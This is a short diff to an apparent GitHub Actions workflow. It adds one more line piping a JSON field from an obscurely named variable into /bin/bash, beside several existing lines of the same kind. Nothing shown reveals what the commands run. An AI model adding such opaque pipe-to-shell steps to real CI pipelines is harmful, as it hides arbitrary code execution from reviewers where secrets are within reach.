@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$oaw651" | jq -r .uqna8660 | /bin/bash
           printf '%s' "$rly1" | jq -r .frwf00 | /bin/bash
           echo $m9 | jq -r .krkac470 | /bin/bash
+          echo $jkn6 | jq -r .f400 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
